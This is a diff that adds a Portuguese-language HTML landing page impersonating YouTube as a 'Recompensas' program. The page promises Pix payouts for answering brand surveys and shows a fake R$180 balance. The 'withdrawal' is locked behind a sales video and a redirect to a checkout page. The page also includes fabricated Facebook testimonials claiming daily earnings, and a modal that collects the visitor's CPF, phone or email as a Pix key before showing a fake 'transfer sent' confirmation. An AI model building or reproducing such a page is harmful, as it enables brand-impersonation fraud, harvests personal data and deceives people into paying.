@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>YouTube Recompensas - Programa Oficial de Avaliação</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+
+  <!-- Background Confetti Canvas for celebration screen -->
+  <div id="confetti-container" style="position: fixed; inset: 0; pointer-events: none; z-index: 999; overflow: hidden;"></div>
+
+  <!-- Header -->
+  <header>
+    <a href="#" class="logo-container">
+      <svg class="logo-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M23.498 6.163a3.003 3.003 0 0 0-2.11-2.11C19.518 3.5 12 3.5 12 3.5s-7.518 0-9.388.553a3.003 3.003 0 0 0-2.11 2.11C0 8.033 0 12 0 12s0 3.967.502 5.837a3.003 3.003 0 0 0 2.11 2.11C6.482 20.5 12 20.5 12 20.5s7.518 0 9.388-.553a3.003 3.003 0 0 0 2.11-2.11C24 15.967 24 12 24 12s0-3.967-.502-5.837z" fill="red"/>
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.545 15.568V8.432L15.818 12l-6.273 3.568z" fill="white"/>
+      </svg>
+      <div class="logo-text">
+        <span></span>
+        <span class="logo-badge">Recompensas</span>
+      </div>
+    </a>
+    
+    <div class="balance-pill" id="balance-pill">
+      <span>Saldo:</span>
+      <div class="balance-value" id="balance-display">R$ 0,00</div>
+    </div>
+  </header>
+
+  <!-- Main Content Area -->
+  <main>
+    
+    <!-- Progress tracker (Only visible during questions) -->
+    <div class="progress-container" id="progress-container">
+      <div class="progress-header">
+        <span>Progresso da Avaliação</span>
+        <span id="progress-text">Pergunta 1 de 3</span>
+      </div>
+      <div class="progress-track">
+        <div class="progress-bar" id="progress-bar"></div>
+      </div>
+    </div>
+
+    <!-- TELA 1: INTRODUÇÃO / BOAS-VINDAS -->
+    <section class="screen active visible" id="screen-intro">
+      <div class="glass-card" style="text-align: center;">
+        <span class="welcome-badge">Programa Oficial</span>
+        <h1 class="title-highlight">Parabéns! Você foi selecionado(a)</h1>
+        <p class="subtitle">
+          O YouTube precisa da sua opinião para melhorar os anúncios exibidos na plataforma. Responda a algumas perguntas simples de grandes marcas patrocinadoras e ganhe recompensas em dinheiro direto na sua conta.
+        </p>
+
+        <div class="intro-benefit-box">
+          <div class="benefit-item">
+            <span class="benefit-icon">✓</span>
+            <div class="benefit-text">Bônus inicial de boas-vindas: <strong>já creditamos R$ 90,00 no seu saldo!</strong></div>
+          </div>
+          <div class="benefit-item">
+            <span class="benefit-icon">✓</span>
+            <div class="benefit-text">Apenas <strong>3 perguntas rápidas</strong> sobre suas preferências.</div>
+          </div>
+          <div class="benefit-item">
+            <span class="benefit-icon">✓</span>
+            <div class="benefit-text">Primeiro saque liberado via <strong>Pix imediato</strong>.</div>
+          </div>
+        </div>
+
+        <button class="btn-primary" id="btn-start">
+          <span>COMEÇAR AVALIAÇÃO</span>
+          <span class="btn-icon">→</span>
+        </button>
+      </div>
+    </section>
+
+    <!-- TELAS DE PERGUNTAS DINÂMICAS -->
+    <section class="screen" id="screen-questionnaire">
+      <div class="glass-card">
+        
+        <!-- Video Player Simulation for Ad context -->
+        <div class="video-preview-container">
+          <div class="video-overlay">
+            <div class="video-title">Anúncio Patrocinador</div>
+            <div class="skip-ad-badge">
+              <span>Pular em 5s</span>
+            </div>
+          </div>
+          <!-- Simulated animated thumbnail representing YouTube questionnaire -->
+          <div style="background: linear-gradient(135deg, #111, #222); width: 100%; height: 100%; display: flex; flex-direction: column; align-items: center; justify-content: center; gap: 15px; color: var(--text-secondary);">
+            <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="color: var(--youtube-red);">
+              <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
+            </svg>
+            <span style="font-size: 13px; font-weight: 500; letter-spacing: 0.5px; text-transform: uppercase;">Pesquisa com Recompensa Ativa</span>
+          </div>
+          <div class="video-play-btn">
+            <svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg>
+          </div>
+        </div>
+
+        <h2 class="question-title" id="question-text">Quais dessas marcas de refrigerante você consome com mais frequência?</h2>
+        <p class="question-subtitle" id="question-sub">Selecione sua marca de preferência abaixo para receber a comissão</p>
+
+        <!-- Dynamic Choice Cards Grid -->
+        <div class="choices-container" id="choices-container">
+          <!-- Populated by JavaScript -->
+        </div>
+
+        <button class="btn-primary" id="btn-next" disabled>
+          <span class="btn-label">Enviar Resposta</span>
+          <div class="spinner" id="btn-spinner"></div>
+          <span class="btn-icon" id="btn-arrow">→</span>
+        </button>
+      </div>
+    </section>
+
+    <!-- TELA 5: CONCLUÍDO / SAQUE -->
+    <section class="screen" id="screen-cashout">
+      <div class="glass-card" style="text-align: center;">
+        <div class="success-checkmark">✓</div>
+        <h1 class="title-highlight">Avaliação Concluída!</h1>
+        <p class="subtitle">
+          Você respondeu a todas as pesquisas de mercado patrocinadas com sucesso. Seu saldo acumulado foi atualizado para o valor de saque.
+        </p>
+
+        <div class="intro-benefit-box" style="text-align: center; background: rgba(46, 204, 113, 0.05); border-color: rgba(46, 204, 113, 0.15);">
+          <span style="font-size: 11px; text-transform: uppercase; font-weight: 700; color: var(--accent-green); letter-spacing: 1px;">Saldo Disponível para Saque</span>
+          <div style="font-size: 32px; font-weight: 800; color: var(--text-primary); margin: 8px 0 4px;">R$ 180,00</div>
+          <span style="font-size: 12px; color: var(--text-secondary);">Isento de tarifas • Processamento instantâneo via Pix</span>
+        </div>
+
+        <p class="question-subtitle" style="margin-bottom: 12px; text-align: left; font-weight: 600;">
+          Para liberar o seu saque imediatamente, assista ao vídeo explicativo de 1 minuto abaixo:
+        </p>
+
+        <!-- HTML5 Video Player with Pix unlock flow (VSL) -->
+        <div class="cashout-video-wrapper" id="vsl-video-wrapper">
+          <video id="vsl-video" class="custom-video-player" src="vsl.mp4" playsinline style="width: 100%; display: block; aspect-ratio: 16/9; object-fit: cover; cursor: pointer;"></video>
+
+          <!-- Video Play Overlay (shows before play starts) -->
+          <div id="video-overlay-play" style="position: absolute; inset: 0; background: rgba(0,0,0,0.65); display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: opacity 0.3s; z-index: 10;">
+            <div style="width: 68px; height: 68px; background: var(--youtube-red); border-radius: 50%; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 25px var(--youtube-red-glow); transition: transform 0.2s;">
+              <svg width="24" height="24" viewBox="0 0 24 24" fill="white" style="margin-left: 3px;">
+                <polygon points="5 3 19 12 5 21 5 3"></polygon>
+              </svg>
+            </div>
+            <span style="font-size: 14px; font-weight: 600; margin-top: 16px; color: white; text-shadow: 0 2px 4px rgba(0,0,0,0.8);">Clique para assistir e liberar o saque</span>
+          </div>
+
+          <!-- Video controls -->
+          <div class="video-controls-overlay" style="z-index: 11;">
+            <div class="video-progress-container" id="video-progress-container">
+              <div class="video-progress-bar" id="video-progress-bar">
+                <div class="video-progress-knob"></div>
+              </div>
+            </div>
+            <div class="video-controls-row">
+              <div class="left-controls">
+                <div class="play-pause-icon" id="video-play-toggle">▶</div>
+                <div class="video-time" id="video-time-display" style="display: none;">0:00 / 0:00</div>
+              </div>
+              <div class="right-controls" id="unlock-badge-status">
+                Bloqueado 🔒
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Cashout button redirects to checkout page -->
+        <button class="btn-primary vsl-btn-hidden" id="btn-cashout-action" disabled onclick="window.location.href='checkout.html'">
+          <span>REALIZAR SAQUE AGORA</span>
+          <span class="btn-icon">💰</span>
+        </button>
+      </div>
+
+      <!-- ══ FACEBOOK COMMENTS SECTION ══ -->
+      <div class="fb-comments-wrapper" id="fb-comments-section">
+        <div class="fb-comments-header">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+          <span class="fb-comments-count">11 de <strong>3.843</strong> comentários</span>
+        </div>
+
+        <div class="fb-sound-notice">
+          🔊 Por favor, verifique se seu som está ligado
+        </div>
+
+        <!-- Comment 1: Sofia Garcia -->
+        <div class="fb-comment">
+          <img src="avatar_sofia.jpg" alt="Sofia Garcia" class="fb-avatar">
+          <div class="fb-comment-body">
+            <div class="fb-comment-bubble">
+              <span class="fb-name">Sofia Garcia</span>
+              <p>Galera, to impressionada!!! Eu assisti o vídeo todo e recebi o acesso à ferramenta. Usei por uns 20 minutinhos e já consegui sacar <strong>R$277 reais</strong>. Indico que assistam o vídeo todo pra receber o acesso à ferramenta também. 🤑</p>
+            </div>
+            <div class="fb-comment-actions">
+              <span class="fb-action">Curtir</span>
+              <span class="fb-dot">·</span>
+              <span class="fb-action">Responder</span>
+              <span class="fb-dot">·</span>
+              <span class="fb-likes">👍 5</span>
+              <span class="fb-dot">·</span>
+              <span class="fb-time">7 min</span>
+            </div>
+            <!-- Replies -->
+            <div class="fb-replies">
+              <div class="fb-comment fb-reply">
+                <img src="avatar_julia.jpg" alt="Julia Alvarenga" class="fb-avatar fb-avatar-sm">
+                <div class="fb-comment-body">
+                  <div class="fb-comment-bubble">
+                    <span class="fb-name">Julia Alvarenga</span>
+                    <p>Deu certo mesmo amiga?</p>
+                  </div>
+                  <div class="fb-comment-actions">
+                    <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+                    <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+                    <span class="fb-likes">👍 2</span><span class="fb-dot">·</span>
+                    <span class="fb-time">5 min</span>
+                  </div>
+                </div>
+              </div>
+              <div class="fb-comment fb-reply">
+                <img src="avatar_sofia.jpg" alt="Sofia Garcia" class="fb-avatar fb-avatar-sm">
+                <div class="fb-comment-body">
+                  <div class="fb-comment-bubble">
+                    <span class="fb-name">Sofia Garcia</span>
+                    <p>Sim amigaaaaa, assiste o vídeo até o final, tu vai ver que é bem facinho de fazer o saque e cai rapidinho 😍</p>
+                  </div>
+                  <div class="fb-comment-actions">
+                    <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+                    <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+                    <span class="fb-likes">👍 3</span><span class="fb-dot">·</span>
+                    <span class="fb-time">4 min</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Comment 2: Carlos Dal Belo -->
+        <div class="fb-comment">
+          <img src="avatar_carlos.jpg" alt="Carlos Dal Belo" class="fb-avatar">
+          <div class="fb-comment-body">
+            <div class="fb-comment-bubble">
+              <span class="fb-name">Carlos Dal Belo</span>
+              <p>Estou usando essa nova ferramenta do Youtube faz 3 meses e desde então nunca mais parei de receber PIX todos os dias só para ajudar o Youtube a analisar os Anúncios. To ganhando uns <strong>200 reais por dia</strong> no mínimo. 💸</p>
+            </div>
+            <div class="fb-comment-actions">
+              <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+              <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+              <span class="fb-likes">👍 12</span><span class="fb-dot">·</span>
+              <span class="fb-time">15 min</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Comment 3: Bernardo Torres -->
+        <div class="fb-comment">
+          <img src="avatar_bernardo.jpg" alt="Bernardo Torres" class="fb-avatar">
+          <div class="fb-comment-body">
+            <div class="fb-comment-bubble">
+              <span class="fb-name">Bernardo Torres</span>
+              <p>To ganhando tanto PIX do Youtube que vou consegui comprar minha motinho nova, testem galera pq realmente funciona... 🏍️</p>
+            </div>
+            <div class="fb-comment-actions">
+              <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+              <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+              <span class="fb-likes">👍 15</span><span class="fb-dot">·</span>
+              <span class="fb-time">21 min</span>
+            </div>
+          </div>
+        </div>
+
+        <!-- Comment 4: Ana Rodriguez -->
+        <div class="fb-comment">
+          <img src="avatar_ana.jpg" alt="Ana Rodriguez" class="fb-avatar">
+          <div class="fb-comment-body">
+            <div class="fb-comment-bubble">
+              <span class="fb-name">Ana Rodriguez</span>
+              <p>Alguém aqui que testou e deu certo? 🤔</p>
+            </div>
+            <div class="fb-comment-actions">
+              <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+              <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+              <span class="fb-likes">👍 17</span><span class="fb-dot">·</span>
+              <span class="fb-time">30 min</span>
+            </div>
+            <!-- Reply -->
+            <div class="fb-replies">
+              <div class="fb-comment fb-reply">
+                <img src="avatar_martina.jpg" alt="Martina Lopez" class="fb-avatar fb-avatar-sm">
+                <div class="fb-comment-body">
+                  <div class="fb-comment-bubble">
+                    <span class="fb-name">Martina Lopez</span>
+                    <p>Oi moça, assiste até o final do vídeo, eu assisti o dindin caiu na minha conta rapidinho, ganhei <strong>420 reais só hoje!</strong> 🥳</p>
+                  </div>
+                  <div class="fb-comment-actions">
+                    <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+                    <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+                    <span class="fb-likes">👍 2</span><span class="fb-dot">·</span>
+                    <span class="fb-time">22 h</span>
+                  </div>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Comment 5: Hanna Larissa -->
+        <div class="fb-comment">
+          <div class="fb-avatar fb-avatar-initials">HL</div>
+          <div class="fb-comment-body">
+            <div class="fb-comment-bubble">
+              <span class="fb-name">Hanna Larissa</span>
+              <p>Olá a todos, eu super recomendo essa nova ferramenta do Youtube, está muito perfeito, o PIX cai em instantes na conta, meu Deusssss, Maravilhoosoooo, obrigado Youtube 🥳🤑</p>
+            </div>
+            <div class="fb-comment-actions">
+              <span class="fb-action">Curtir</span><span class="fb-dot">·</span>
+              <span class="fb-action">Responder</span><span class="fb-dot">·</span>
+              <span class="fb-likes">👍 23</span><span class="fb-dot">·</span>
+              <span class="fb-time">1 h</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="fb-login-prompt">
+          <svg width="16" height="16" viewBox="0 0 24 24" fill="#1877f2"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
+          Precisa logar para comentar
+        </div>
+      </div>
+    </section>
+  </main>
+
+  <!-- PIX CASHOUT MODAL -->
+  <div id="pix-modal" style="position: fixed; inset: 0; background: rgba(0,0,0,0.85); backdrop-filter: blur(8px); display: none; align-items: center; justify-content: center; z-index: 1000; padding: 20px; opacity: 0; transition: opacity 0.3s ease;">
+    <div class="glass-card" style="width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 40px rgba(0,0,0,0.8);">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px;">
+        <h3 style="font-size: 18px; font-weight: 700;">Solicitar Transferência Pix</h3>
+        <button id="close-modal" style="background: none; border: none; color: var(--text-secondary); font-size: 20px; cursor: pointer; padding: 4px;">&times;</button>
+      </div>
+
+      <div style="background: rgba(255,255,255,0.03); border: 1px solid var(--card-border); border-radius: 12px; padding: 14px; margin-bottom: 20px; text-align: left;">
+        <span style="font-size: 11px; color: var(--text-secondary); text-transform: uppercase; font-weight: 600;">Destinatário da Recompensa</span>
+        <div style="font-size: 15px; font-weight: 600; color: white; margin-top: 4px;">Avaliador Selecionado</div>
+        <div style="font-size: 14px; font-weight: 700; color: var(--accent-green); margin-top: 2px;">Valor: R$ 180,00</div>
+      </div>
+
+      <!-- Pix Form -->
+      <div style="text-align: left; display: flex; flex-direction: column; gap: 16px;" id="pix-form-fields">
+        <div>
+          <label style="font-size: 12px; font-weight: 600; color: var(--text-secondary); display: block; margin-bottom: 8px;">Tipo de Chave Pix</label>
+          <div style="display: grid; grid-template-columns: repeat(2, 1fr); gap: 8px;">
+            <div class="choice-card selected" style="padding: 10px; border-radius: 8px; font-size: 13px; justify-content: center; margin-bottom: 0;" data-pix-type="cpf">CPF</div>
+            <div class="choice-card" style="padding: 10px; border-radius: 8px; font-size: 13px; justify-content: center; margin-bottom: 0;" data-pix-type="phone">Celular</div>
+            <div class="choice-card" style="padding: 10px; border-radius: 8px; font-size: 13px; justify-content: center; margin-bottom: 0;" data-pix-type="email">E-mail</div>
+            <div class="choice-card" style="padding: 10px; border-radius: 8px; font-size: 13px; justify-content: center; margin-bottom: 0;" data-pix-type="random">Chave Aleatória</div>
+          </div>
+        </div>
+
+        <div>
+          <label for="pix-key-input" style="font-size: 12px; font-weight: 600; color: var(--text-secondary); display: block; margin-bottom: 8px;">Chave Pix</label>
+          <input type="text" id="pix-key-input" placeholder="000.000.000-00" style="width: 100%; background: rgba(0,0,0,0.3); border: 1px solid var(--card-border); border-radius: 10px; padding: 14px; color: white; font-family: inherit; font-size: 14px; transition: border-color 0.2s;" />
+        </div>
+
+        <button class="btn-primary" id="btn-submit-pix" style="margin-top: 10px;">
+          <span>CONFIRMAR SAQUE</span>
+          <div class="spinner" id="pix-spinner"></div>
+          <span class="btn-icon">✓</span>
+        </button>
+      </div>
+
+      <!-- Loading Transfer State -->
+      <div id="pix-loading-state" style="display: none; padding: 30px 10px; flex-direction: column; align-items: center; justify-content: center; gap: 20px;">
+        <div class="spinner" style="display: block; width: 48px; height: 48px; border-width: 4px; border-top-color: var(--accent-green);"></div>
+        <div>
+          <h4 style="font-size: 16px; font-weight: 700; margin-bottom: 6px;" id="pix-loading-title">Processando Transferência...</h4>
+          <p style="font-size: 13px; color: var(--text-secondary);" id="pix-loading-sub">Comunicando com o Banco Central</p>
+        </div>
+      </div>
+
+      <!-- Success Transfer State -->
+      <div id="pix-success-state" style="display: none; padding: 20px 10px; flex-direction: column; align-items: center; justify-content: center; gap: 16px;">
+        <div style="width: 60px; height: 60px; border-radius: 50%; background: rgba(46, 204, 113, 0.1); border: 2px solid var(--accent-green); display: flex; align-items: center; justify-content: center; color: var(--accent-green); font-size: 24px; box-shadow: 0 0 15px rgba(46, 204, 113, 0.2);">✓</div>
+        <div>
+          <h4 style="font-size: 18px; font-weight: 800; color: white; margin-bottom: 6px;">Saque Enviado!</h4>
+          <p style="font-size: 13px; color: var(--text-secondary); line-height: 1.5; max-width: 280px; margin: 0 auto;">
+            A quantia de <strong>R$ 180,00</strong> foi transferida via Pix para a chave fornecida. O saldo pode levar até 2 minutos para constar na sua conta.
+          </p>
+        </div>
+        <button class="btn-primary" id="btn-success-close" style="margin-top: 10px; background: rgba(255,255,255,0.06); border: 1px solid var(--card-border); color: white; box-shadow: none;">
+          <span>Fechar Janela</span>
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <footer>
+    <div class="footer-logo">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M23.498 6.163a3.003 3.003 0 0 0-2.11-2.11C19.518 3.5 12 3.5 12 3.5s-7.518 0-9.388.553a3.003 3.003 0 0 0-2.11 2.11C0 8.033 0 12 0 12s0 3.967.502 5.837a3.003 3.003 0 0 0 2.11 2.11C6.482 20.5 12 20.5 12 20.5s7.518 0 9.388-.553a3.003 3.003 0 0 0 2.11-2.11C24 15.967 24 12 24 12s0-3.967-.502-5.837z" fill="gray"/>
+        <path fill-rule="evenodd" clip-rule="evenodd" d="M9.545 15.568V8.432L15.818 12l-6.273 3.568z" fill="white"/>
+      </svg>
+      <span style="font-weight: 700; letter-spacing: -0.5px;">YouTube <span style="font-weight: 400; font-size: 11px;">Recompensas</span></span>
+    </div>
+    
+    <div class="footer-links">
+      <a href="#">Termos de Serviço</a>
+      <a href="#">Políticas de Privacidade</a>
+      <a href="#">Contato e Suporte</a>
+    </div>
+
+    <div class="footer-sec-badge">
+      <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="color: var(--accent-green);">
+        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+        <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+      </svg>
+      <span style="font-size: 10px; font-weight: 600; color: var(--text-secondary);">Conexão Criptografada SSL Segura</span>
+    </div>
+
+    <div>
+      © 2026 YouTube LLC. Todos os direitos reservados.
+    </div>
+  </footer>
+
+  <script src="app.js"></script>
+</body>
+</html>
